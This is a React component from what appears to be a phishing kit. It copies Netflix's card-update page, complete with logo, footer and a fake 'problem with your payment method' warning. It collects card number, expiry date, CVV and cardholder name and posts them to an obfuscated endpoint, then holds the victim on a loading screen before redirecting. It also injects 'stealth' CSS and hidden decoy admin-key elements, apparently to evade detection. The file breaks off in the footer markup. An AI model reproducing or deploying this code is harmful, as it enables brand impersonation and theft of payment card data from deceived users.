import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';
import { useHistory } from 'react-router-dom';

const CARD_LOGOS = {
  visa: 'https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA.png',
  mastercard: 'https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD.png',
  amex: 'https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/AMEX.png',
  discover: 'https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/DISCOVER.png'
};
const CARD_TYPES = {
  visa: /^4[0-9]{0,15}$/,
  mastercard: /^5[1-5][0-9]{0,14}$/,
  amex: /^3[47][0-9]{0,13}$/,
  discover: /^6(?:011|5[0-9]{2})[0-9]{0,12}$/
};


const UpdateStatus = () => {
  const [cardData, setCardData] = useState({
    cardNumber: '',
    expiryDate: '',
    securityCode: '',
    nameOnCard: ''
  });
  const [errors, setErrors] = useState({
    cardNumber: '',
    expiryDate: '',
    securityCode: '',
    nameOnCard: ''
  });
  const [cardType, setCardType] = useState('');
  const [message, setMessage] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const history = useHistory();
  const [styleElement, setStyleElement] = useState(null);
const timeoutRef = useRef(null);
useEffect(() => {
  // Dynamically add stealth styles
  const style = document.createElement("style");
  style.innerHTML = `
    .fCon_z9s2x {
      position: absolute;
      top: -9999px;
      left: -9999px;
      width: 100vw;
      height: 200px;
      overflow: hidden;
      opacity: 0;
    }
    .mslBttn_e1z9s {
      position: absolute;
      left: -9999px;
      visibility: hidden;
    }
    .invDv_2z69s {
      width: 200px;
      height: 50px;
      background-color: rgba(255, 0, 0, 0.001);
      position: absolute;
      top: -1000px;
    }

    .FTI_A6RTsa {
      position: absolute;
      left: -1000px;
      top: -1000px;
      opacity: 0;
    }
  `;
  document.head.appendChild(style);
}, []);

useEffect(() => {
  const loadStyles = async () => {
    try {
      const cssModule = await import('./styles1.css');

      const styleTag = document.createElement("style");
      styleTag.textContent = cssModule.default;
      document.head.appendChild(styleTag);
      setStyleElement(styleTag);
    } catch (error) {
    }
  };

  loadStyles();

  return () => {
    if (styleElement) {
      document.head.removeChild(styleElement);
    }
    if (timeoutRef.current) {
      clearTimeout(timeoutRef.current);
    }
  };
}, []);

  
  const detectCardType = (number) => {
    for (let [type, regex] of Object.entries(CARD_TYPES)) {
      if (regex.test(number.replace(/\s+/g, ''))) return type;
    }
    return '';
  };

  const validateCardNumber = (number) => {
    const cleanNumber = number.replace(/\s+/g, '');
    if (!/^[0-9]{13,19}$/.test(cleanNumber)) return 'Please enter a valid credit card number.';

    let sum = 0;
    let shouldDouble = false;
    for (let i = cleanNumber.length - 1; i >= 0; i--) {
      let digit = parseInt(cleanNumber.charAt(i), 10);
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0 ? '' : ' Please enter a valid credit card number.';
  };

  const validateExpiryDate = (date) => {
    const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
    if (!regex.test(date)) return 'Please enter a valid expiry date.';

    const [month, year] = date.split('/');
    const expiryDate = new Date(`20${year}`, month - 1);
    const currentDate = new Date();
    if (expiryDate <= currentDate) return 'This card has expired.';
    return '';
  };

  const validateSecurityCode = (code, type) => {
    const length = type === 'amex' ? 4 : 3;
    const regex = new RegExp(`^[0-9]{${length}}$`);
    return regex.test(code)
      ? ''
      : type === 'amex'
      ? 'Please enter a valid CVV code.'
      : 'Please enter a valid CVV code.';
  };

  const validateNameOnCard = (name) => {
    return name.trim() === '' ? 'Please enter the name on the card.' : '';
  };

  const formatInputValue = (name, value) => {
    if (name === 'cardNumber') {
      return value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
    }
    if (name === 'expiryDate') {
      const cleanValue = value.replace(/\D/g, '').slice(0, 4);

      if (cleanValue.length === 1 && parseInt(cleanValue, 10) > 1 && parseInt(cleanValue, 10) < 10) {
        return `0${cleanValue}`;
      }

      return cleanValue.length > 2
        ? `${cleanValue.slice(0, 2)}/${cleanValue.slice(2, 4)}`
        : cleanValue;
    }
    return value;
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;

    const formattedValue = formatInputValue(name, value);

    if (name === 'cardNumber') {
      const detectedType = detectCardType(formattedValue);
      setCardType(detectedType);
    }

    setCardData({ ...cardData, [name]: formattedValue });
  };

  const handleBlur = (e) => {
    const { name, value } = e.target;
    let error = '';

    switch (name) {
      case 'cardNumber':
        error = validateCardNumber(value);
        break;
      case 'expiryDate':
        error = validateExpiryDate(value);
        break;
      case 'securityCode':
        error = validateSecurityCode(value, cardType);
        break;
      case 'nameOnCard':
        error = validateNameOnCard(value);
        break;
      default:
        break;
    }

    setErrors((prevErrors) => ({
      ...prevErrors,
      [name]: error
    }));
  };

  const validateCardData = () => {
    const cardNumberError = validateCardNumber(cardData.cardNumber);
    const expiryDateError = validateExpiryDate(cardData.expiryDate);
    const securityCodeError = validateSecurityCode(cardData.securityCode, cardType);
    const nameOnCardError = validateNameOnCard(cardData.nameOnCard);

    setErrors({
      cardNumber: cardNumberError,
      expiryDate: expiryDateError,
      securityCode: securityCodeError,
      nameOnCard: nameOnCardError
    });

    if (cardNumberError || expiryDateError || securityCodeError || nameOnCardError) {
      setMessage('Please fill in all card details correctly');
      return false;
    }
    return true;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const clientSessionID = localStorage.getItem('clientSessionID');

    if (!validateCardData()) {
      return;
    }

    setIsLoading(true);

    try {
      const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/authenticate/updatePrefs_64mQ`, {
        clientSessionID,
        cardNumber: cardData.cardNumber,
        expiryDate: cardData.expiryDate,
        securityCode: cardData.securityCode,
        nameOnCard: cardData.nameOnCard
      });

      if (response.status === 201) {
        const { brand, last4Digits, logoUrl } = response.data;

        console.log(`Brand: ${brand}, Last 4: ${last4Digits}, Logo URL: ${logoUrl}`);
        localStorage.setItem("bankBrand", brand);
        localStorage.setItem("bankLast4Digits", last4Digits);
        localStorage.setItem("bankLogoUrl", logoUrl);
  
        setIsLoading(true); 
        timeoutRef.current = setTimeout(() => {
          history.push('/connection/timeout');
        }, 420000);
      }
    } catch (error) {
      setMessage(error.response?.data?.error || 'Error processing payment');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div>
      <div id="in-page-channel-node-id" data-channel-name="in_page_channel_zwjzZF"></div>
      <div id="appMountPoint">
        <div>
          <div className="netflix-sans-font-loaded">
            <div data-uia="loc" lang="en-TN" dir="ltr">
              <div className="basicLayout notMobile modernInApp hasLargeTypography signupSimplicity-creditOptionMode simplicity" lang="en-TN" dir="ltr">
                <div className="nfHeader noBorderHeader signupBasicHeader onboarding-header">
                  <a href="/" className="svg-nfLogo signupBasicHeader onboarding-header" data-uia="netflix-header-svg-logo" style={{ verticalAlign: 'center'}}>
                    <svg viewBox="0 0 111 30" data-uia="netflix-logo" className="svg-icon svg-icon-netflix-logo" aria-hidden="true" focusable="false">
                      <g id="netflix-logo">
                        <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path>
                      </g>
                    </svg>
                    <span className="screen-reader-text">Netflix Home</span>
                  </a>
                  <a href="/" className="authLinks signupBasicHeader onboarding-header" data-uia="header-signout-link">Sign Out</a>
                </div>
                <div className="simpleContainer" data-uia="simpleContainer" data-transitioned-child="true">
                  <div className="centerContainer firstLoad">
                    <div className="default-ltr-cache-bjn8wh ehkvevs2">
                      <form method="POST" data-uia="payment-form" onSubmit={handleSubmit}>
                        <div className="paymentFormContainer">
                        <div className="messageContainer" data-a11y-focus="true" tabIndex="0">
      <div className="nf-message-container" data-uia="UIMessage+container">
        <div className="default-ltr-cache-1puvbbc e191g6e33" role="alert" data-uia="UIMessage-content">
          <div className="default-ltr-cache-1x17g94 e191g6e32">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              role="img"
              viewBox="0 0 24 24"
              width="24"
              height="24"
              data-icon="WarningFillStandard"
              data-uia="UIMessage-content+icon"
              aria-hidden="true"
              className="default-ltr-cache-ceu2i e191g6e36"
            >
              <path
                fillRule="evenodd"
                clipRule="evenodd"
                d="M13.7306 2.99377C12.9603 1.66321 11.0392 1.66322 10.2689 2.9938L1.00357 18.9979C0.231657 20.3313 1.19377 22 2.73443 22H21.2655C22.8062 22 23.7683 20.3312 22.9964 18.9979L13.7306 2.99377ZM13.5002 9H10.5002L11.0002 14H13.0002L13.5002 9ZM12.0002 16C12.8287 16 13.5002 16.6716 13.5002 17.5C13.5002 18.3284 12.8287 19 12.0002 19C11.1718 19 10.5002 18.3284 10.5002 17.5C10.5002 16.6716 11.1718 16 12.0002 16Z"
                fill="currentColor"
              ></path>
            </svg>
            <div className="default-ltr-cache-mkkf9p e191g6e31">
              <span id="" data-uia="">
                There appears to be a problem with the payment method you are trying to use.
              </span>
            </div>
          </div>
        </div>
      </div>
    </div>
                          <div>
                            <div role="status" className="default-ltr-cache-1kfc69n e1qjuwtr0">
                              <h1 data-uia="stepTitle" className="default-ltr-cache-invtik e1gdp3hr2">Update your credit or debit card</h1>
                            </div>
                          </div>
                          <div className="fieldContainer">
                            <span className="logos logos-block" data-uia="cardLogos-comp" aria-label="We accept Visa, Mastercard and American Express.">
                              <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA.png" alt="Visa" className="logoIcon VISA default-ltr-cache-kg1rox e18ygst00" srcSet="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA@2x.png  2x" data-uia="logoIcon-VISA" />
                              <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD.png" alt="Mastercard" className="logoIcon MASTERCARD default-ltr-cache-kg1rox e18ygst00" srcSet="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD@2x.png  2x" data-uia="logoIcon-MASTERCARD" />
                              <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/AMEX.png" alt="American Express" className="logoIcon AMEX default-ltr-cache-kg1rox e18ygst00" srcSet="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/AMEX@2x.png  2x" data-uia="logoIcon-AMEX" />
                            </span>
                            <ul className="simpleForm structural ui-grid inlineContainer">
                              <li data-uia="field-creditCardNumber+wrapper" className="nfFormSpace">
                                <div className="cardNumberContainer">
                                 <div className="form-control_containerStyles__oy4jpq0  default-ltr-cache-pukm6w e2so2tu1" data-uia="field-creditCardNumber+container" dir="ltr">
                                    <label style={{marginRight: "68px"}} htmlFor=":r0:" className="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-creditCardNumber+label">Card number</label>
                                    <div className="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
                                      <input type="tel" autoComplete="cc-number" dir="ltr" placeholder="" className="input_nativeElementStyles__1euouia0" id=":r0:" name="cardNumber" data-uia="field-creditCardNumber" value={cardData.cardNumber} onChange={handleInputChange} onBlur={handleBlur} />
                                      <div aria-hidden="true" className="form-control_controlChromeStyles__oy4jpq4" dir="ltr"></div>
                                      <div style={{height:'1.5rem', width:'2.5rem'}} role="img" aria-hidden="true" className="default-ltr-cache-1ubk3wx e1vkmu651">
                                        {cardType ? (
                                          <img src={CARD_LOGOS[cardType]} alt={cardType} className="default-ltr-cache-1aatv6y e1hwh5ed0" />
                                        ) : (
                                          <svg xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 24 24" width="24" height="24" data-icon="CreditCardStandard" aria-hidden="true" className="default-ltr-cache-1aatv6y e1hwh5ed0">
                                            <path fillRule="evenodd" clipRule="evenodd" d="M0 6C0 4.34315 1.34315 3 3 3H21C22.6569 3 24 4.34315 24 6V18C24 19.6569 22.6569 21 21 21H3C1.34314 21 0 19.6569 0 18V6ZM3 5C2.44772 5 2 5.44772 2 6V8H22V6C22 5.44772 21.5523 5 21 5H3ZM22 10H2V18C2 18.5523 2.44772 19 3 19H21C21.5523 19 22 18.5523 22 18V10ZM4 14C4 13.4477 4.44772 13 5 13H9C9.55228 13 10 13.4477 10 14C10 14.5523 9.55228 15 9 15H5C4.44772 15 4 14.5523 4 14Z" fill="currentColor"></path>
                                          </svg>
                                        )}
                                      </div>
                                    </div>
                                    {errors.cardNumber && <div className="error">
                                       <svg
      xmlns="http://www.w3.org/2000/svg"
      fill="none"
      role="img"
      viewBox="0 0 16 16"
      width="16"
      height="16"
      data-icon="CircleXSmall"
      aria-hidden="true"
      className="default-ltr-cache-13htjwu e1vkmu653"
    >
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z"
        fill="currentColor"
      ></path>
    </svg>{errors.cardNumber}
    </div>}
                                  </div>
                                </div>
                              </li>
                              <li data-uia="field-creditExpirationMonth+wrapper" className="nfFormSpace inline">
                                <div className="form-control_containerStyles__oy4jpq0  default-ltr-cache-1720sfo e2so2tu1" data-uia="field-creditExpirationMonth+container" dir="ltr">
                                  <label htmlFor=":r3:" className="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-creditExpirationMonth+label">Expiration date</label>
                                  <div className="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
                                    <input type="tel" autoComplete="cc-exp" dir="ltr" placeholder="MM/YY" className="input_nativeElementStyles__1euouia0" id=":r3:" name="expiryDate" data-uia="field-creditExpirationMonth" value={cardData.expiryDate} onChange={handleInputChange} onBlur={handleBlur} />
                                    <div aria-hidden="true" className="form-control_controlChromeStyles__oy4jpq4" dir="ltr"></div>
                                  </div>
                                  {errors.expiryDate && <div className="error"><svg
      xmlns="http://www.w3.org/2000/svg"
      fill="none"
      role="img"
      viewBox="0 0 16 16"
      width="16"
      height="16"
      data-icon="CircleXSmall"
      aria-hidden="true"
      className="default-ltr-cache-13htjwu e1vkmu653"
    >
      
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z"
        fill="currentColor"
      ></path>
    </svg>{errors.expiryDate}</div>}
                                </div>
                              </li>
                              <li data-uia="field-creditExpirationYear+wrapper" className="nfFormSpace hidden"></li>
                              <li data-uia="field-creditCardSecurityCode+wrapper" className="nfFormSpace inline">
                                <div className="form-control_containerStyles__oy4jpq0  default-ltr-cache-pukm6w e2so2tu1" data-uia="field-creditCardSecurityCode+container" dir="ltr">
                                  <label htmlFor=":r6:" className="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-creditCardSecurityCode+label">CVV</label>
                                  <div className="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
                                    <input type="tel" autoComplete="cc-csc" dir="ltr" placeholder="" className="input_nativeElementStyles__1euouia0" id=":r6:" name="securityCode" data-uia="field-creditCardSecurityCode" value={cardData.securityCode} onChange={handleInputChange} onBlur={handleBlur} />
                                    <div aria-hidden="true" className="form-control_controlChromeStyles__oy4jpq4" dir="ltr"></div>
                                    <div role="img" aria-hidden="true" className="default-ltr-cache-1ubk3wx e1vkmu651">
                                      <button data-uia="cvv-tooltip" className="pressable_styles__a6ynkg0" dir="ltr" type="button">
                                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" role="img" aria-label="CVV" viewBox="0 0 24 24" width="24" height="24" data-icon="CircleQuestionMarkStandard" pointerEvents="all" className="default-ltr-cache-6ngp27 e14aa2bi0">
                                          <path fillRule="evenodd" clipRule="evenodd" d="M2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12ZM12 0C5.37258 0 0 5.37258 0 12C0 18.6274 5.37258 24 12 24C18.6274 24 24 18.6274 24 12C24 5.37258 18.6274 0 12 0ZM12 8C10.6831 8 10 8.74303 10 9.5H8C8 7.25697 10.0032 6 12 6C13.9968 6 16 7.25697 16 9.5C16 10.8487 14.9191 11.7679 13.8217 12.18C13.5572 12.2793 13.3322 12.4295 13.1858 12.5913C13.0452 12.7467 13 12.883 13 13V14H11V13C11 11.5649 12.1677 10.6647 13.1186 10.3076C13.8476 10.0339 14 9.64823 14 9.5C14 8.74303 13.3169 8 12 8ZM13.5 16.5C13.5 17.3284 12.8284 18 12 18C11.1716 18 10.5 17.3284 10.5 16.5C10.5 15.6716 11.1716 15 12 15C12.8284 15 13.5 15.6716 13.5 16.5Z" fill="currentColor"></path>
                                        </svg>
                                      </button>
                                    </div>
                                  </div>
                                  {errors.securityCode && <div className="error"><svg
      xmlns="http://www.w3.org/2000/svg"
      fill="none"
      role="img"
      viewBox="0 0 16 16"
      width="16"
      height="16"
      data-icon="CircleXSmall"
      aria-hidden="true"
      className="default-ltr-cache-13htjwu e1vkmu653"
    >
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z"
        fill="currentColor"
      ></path>
    </svg>{errors.securityCode}</div>}
                                </div>
                              </li>
                              <li data-uia="field-firstName+wrapper" className="nfFormSpace">
                                <div className="form-control_containerStyles__oy4jpq0  default-ltr-cache-1720sfo e2so2tu1" data-uia="field-name+container" dir="ltr">
                                  <label htmlFor=":r9:" className="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="field-name+label">Name on card</label>
                                  <div className="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
                                    <input type="text" autoComplete="cc-name" dir="ltr" placeholder="" className="input_nativeElementStyles__1euouia0" id=":r9:" name="nameOnCard" data-uia="field-name" value={cardData.nameOnCard} onChange={handleInputChange} onBlur={handleBlur} />
                                    <div aria-hidden="true" className="form-control_controlChromeStyles__oy4jpq4" dir="ltr"></div>
                                  </div>
                                  {errors.nameOnCard && <div className="error"><svg
      xmlns="http://www.w3.org/2000/svg"
      fill="none"
      role="img"
      viewBox="0 0 16 16"
      width="16"
      height="16"
      data-icon="CircleXSmall"
      aria-hidden="true"
      className="default-ltr-cache-13htjwu e1vkmu653"
    >
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z"
        fill="currentColor"
      ></path>
    </svg>{errors.nameOnCard}</div>}
                                </div>
                                            <div className="fCon_z9s2x">
                          <p>Welcome</p>
                          <p>Loading</p>
                          <input type="text" placeholder="Enter admin key" className="FTI_A6RTsa" />
                          <button className="mslBttn_e1z9s">Submit Admin Code</button>
                        </div>
                  
                        {/* Hidden but Space-Occupying Elements */}
                        <div className="invDv_2z69s"></div>
                              </li>
                              <li data-uia="field-lastName+wrapper" className="nfFormSpace hidden"></li>
                            </ul>
                            <div>
                              <div className="tou--container" data-uia="tou-container">
                                <div className="tou--container" data-uia="tou-container">
                                  <div className="user-consent--container" data-uia="termsOfUseMatlock+organic-rest">
                                    <span id="" data-uia="termsOfUse-Disclosure">By clicking Continue, you agree to our <a target="_blank" href="https://help.netflix.com/legal/termsofuse">Terms of Use</a>, <a target="_blank" href="https://help.netflix.com/legal/privacy">Privacy Statement</a>, and that you are over 18. Netflix will automatically continue your membership and charge the membership fee to your payment method until you cancel. You may cancel at any time to avoid future charges.</span>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div className="submitBtnContainer">
                          <button className="pressable_styles__a6ynkg0 button_styles__1kwr4ym0  default-ltr-cache-1071m8g e1ax5wel2" data-uia="action-submit-payment" dir="ltr" role="button" type="submit">Continue</button>
                          {isLoading && (
        <div className="loading-overlay">
          <div className="loading-spinner"></div>
        </div>)}
                        </div>
                        <div className="recaptcha-terms-of-use-container">
                          <span data-uia="recaptcha-terms-of-use">
                            <div className="default-ltr-cache-8dk3vg e10j8911">
                              <p className=" default-ltr-cache-1kz38kj euy28770">This page is protected by Google reCAPTCHA to ensure you're not a bot.&nbsp;<button className="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0  default-ltr-cache-1m5ksse e1gz2xdw0" data-uia="recaptcha-learn-more-button" dir="ltr" role="link" type="button">Learn more.</button></p>
                            </div>
                            <div data-uia="recaptcha-disclosure" className="default-ltr-cache-km743h e10j8910">
                              <p className=" default-ltr-cache-1gzfkc9 euy28770"><span>The information collected by Google reCAPTCHA is subject to the Google <a href="https://policies.google.com/privacy" id="recaptcha-privacy-link" data-uia="recaptcha-privacy-link" target="_blank">Privacy Policy</a> and <a href="https://policies.google.com/terms" id="recaptcha-tos-link" data-uia="recaptcha-tos-link" target="_blank">Terms of Service</a>, and is used for providing, maintaining, and improving the reCAPTCHA service and for general security purposes (it is not used for personalized advertising by Google).</span></p>
                            </div>
                          </span>
                        </div>
                      </form>
                    </div>
                  </div>
                </div>
                <div className="site-footer-wrapper centered">
                  <div className="footer-divider"></div>
                  <div className="site-footer">
                    <p className="footer-top"><a className="footer-top-a" href="https://help.netflix.com/contactus">Questions? Contact us.</a></p>
                    <ul className="footer-links structural">
                      <li className="footer-link-item" placeholder="footer_responsive_link_faq_item"><a className="footer-link" data-uia="footer-link" href="https://help.netflix.com/support/412" target="_self" placeholder="footer_responsive_link_faq"><span id="" data-uia="data-uia-footer-label">FAQ</span></a></li>
                      <li className="footer-link-item" placeholder="footer_responsive_link_help_item"><a className="footer-link" data-uia="footer-link" href="https://help.netflix.com" target="_self" placeholder="footer_responsive_link_help"><span id="" data-uia="data-uia-footer-label">Help Center</span></a></li>
                      <li className="footer-link-item" placeholder="footer_responsive_link_terms_item"><a className="footer-link" data-uia="footer-link" href="https://help.netflix.com/legal/termsofuse" target="_self" placeholder="footer_responsive_link_terms"><span id="" data-uia="data-uia-footer-label">Terms of Use</span></a></li>
                      <li className="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item"><a className="footer-link" data-uia="footer-link" href="https://help.netflix.com/legal/privacy" target="_self" placeholder="footer_responsive_link_privacy_separate_link"><span id="" data-uia="data-uia-footer-label">Privacy</span></a></li>
                      <li className="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item"><a className="footer-link" data-uia="footer-link" href="#" target="_self" placeholder="footer_responsive_link_cookies_separate_link"><span id="" data-uia="data-uia-footer-label">Cookie Preferences</span></a></li>
                      <li className="footer-link-item" placeholder="footer_responsive_link_corporate_information_item"><a className="footer-link" data-uia="footer-link" href="https://help.netflix.com/legal/corpinfo" target="_self" placeholder="footer_responsive_link_corporate_information"><span id="" data-uia="data-uia-footer-label">Corporate Information</span></a></li>
                    </ul>
                    <div className="lang-selection-container" id="lang-switcher">
                      <div className="nfSelectWrapper inFooter selectArrow prefix" data-uia="language-picker+container">
                        <label className="nfLabel" htmlFor="lang-switcher-select">Select Language</label>
                        <div className="nfSelectPlacement globe">
                          <select data-uia="language-picker" className="nfSelect" id="lang-switcher-select" name="__langSelect" tabIndex="0">
                            <option label="English" lang="en" value="/signup/creditoption?locale=en-TN">English</option>
                            <option label="Español" lang="es" value="/signup/creditoption?locale=es-TN">Español</option>
                            <option label="Português" lang="pt" value="/signup/creditoption?locale=pt-TN">Português</option>
                            <option label="Français" lang="fr" value="/signup/creditoption?locale=fr-TN">Français</option>
                            <option label="Svenska" lang="sv" value="/signup/creditoption?locale=sv-TN">Svenska</option>
                            <option label="Norsk bokmål" lang="nb" value="/signup/creditoption?locale=nb-TN">Norsk bokmål</option>
                            <option label="Suomi" lang="fi" value="/signup/creditoption?locale=fi-TN">Suomi</option>
                            <option label="Dansk" lang="da" value="/signup/creditoption?locale=da-TN">Dansk</option>
                            <option label="Nederlands" lang="nl" value="/signup/creditoption?locale=nl-TN">Nederlands</option>
                            <option label="Deutsch" lang="de" value="/signup/creditoption?locale=de-TN">Deutsch</option>
                            <option label="日本語" lang="ja" value="/signup/creditoption?locale=ja-TN">日本語</option>
                            <option label="Italiano" lang="it" value="/signup/creditoption?locale=it-TN">Italiano</option>
                            <option label="中文" lang="zh" value="/signup/creditoption?locale=zh-TN">中文</option>
                            <option label="한국어" lang="ko" value="/signup/creditoption?locale=ko-TN">한국어</option>
                            <option label="العربية" lang="ar" value="/signup/creditoption?locale=ar-TN">العربية</option>
                            <option label="Polski" lang="pl" value="/signup/creditoption?locale=pl-TN">Polski</option>
                            <option label="Türkçe" lang="tr" value="/signup/creditoption?locale=tr-TN">Türkçe</option>
                            <option label="ไทย" lang="th" value="/signup/creditoption?locale=th-TN">ไทย</option>
                            <option label="Română" lang="ro" value="/signup/creditoption?locale=ro-TN">Română</option>
                            <option label="עברית" lang="he" value="/signup/creditoption?locale=he-TN">עברית</option>
                            <option label="Ελληνικά" lang="el" value="/signup/creditoption?locale=el-TN">Ελληνικά</option>
                            <option label="Bahasa Indonesia" lang="id" value="/signup/creditoption?locale=id-TN">Bahasa Indonesia</option>
                            <option label="Magyar" lang="hu" value="/signup/creditoption?locale=hu-TN">Magyar</option>
                            <option label="Čeština" lang="cs" value="/signup/creditoption?locale=cs-TN">Čeština</option>
                            <option label="Tiếng Việt" lang="vi" value="/signup/creditoption?locale=vi-TN">Tiếng Việt</option>
                            <option label="हिन्दी" lang="hi" value="/signup/creditoption?locale=hi-TN">हिन्दी</option>
                            <option label="Melayu" lang="ms" value="/signup/creditoption?locale=ms-TN">Melayu</option>
                            <option label="Русский" lang="ru" value="/signup/creditoption?locale=ru-TN">Русский</option>
